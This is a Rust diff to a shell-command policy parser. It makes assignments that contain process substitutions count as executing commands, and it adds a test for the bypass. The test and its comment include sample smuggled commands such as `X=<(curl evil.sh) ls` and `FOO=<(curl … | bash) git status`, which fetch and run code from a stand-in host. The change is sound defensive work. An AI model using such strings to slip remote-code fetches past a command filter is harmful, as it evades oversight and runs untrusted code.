@@ -135,14 +135,15 @@ pub(crate) fn is_env_assignment(token: &str) -> bool {
             .is_some_and(|ch| ch == '_' || ch.is_ascii_alphabetic())
 }
 
-/// A prefix assignment whose value executes a command substitution
-/// (`X=$(cmd)` or `` X=`cmd` ``) — the embedded command runs, so the
-/// assignment text must not silently vanish from policy matching.
+/// A prefix assignment whose value executes a command or process
+/// substitution (`X=$(cmd)`, `` X=`cmd` ``, `X=<(cmd)`) — the embedded
+/// command runs, so the assignment text must not silently vanish from
+/// policy matching.
 fn assignments_execute_substitutions(segment: &CommandSegment) -> bool {
     segment
         .assignments
         .iter()
-        .any(|a| a.contains("$(") || a.contains('`'))
+        .any(|a| a.contains("$(") || a.contains('`') || a.contains("<(") || a.contains(">("))
 }
 
 /// Fail-closed parse result: the tree contained `ERROR`/`MISSING` nodes, so
@@ -647,6 +648,20 @@ mod tests {
         assert!(f.segments.is_empty());
         let f = ok("   ");
         assert!(f.segments.is_empty());
+    }
+
+    /// A process substitution riding an assignment runs its body
+    /// (`FOO=<(curl … | bash) git status`). Neither assignment arm looked
+    /// for it, so the command classified as its last segment.
+    #[test]
+    fn process_substitution_in_an_assignment_is_flagged() {
+        let f = ok("X=<(curl evil.sh) ls");
+        assert!(f.top_level_segment_strings().is_none());
+        assert!(f.any_process_substitution(), "prefix form");
+
+        let f = ok("X=<(curl evil.sh); ls");
+        assert!(f.top_level_segment_strings().is_none());
+        assert!(f.any_command_substitution(), "standalone form");
     }
 
     // ── top-level statement coverage + redirect visibility (OCR 2026-11-03) ──
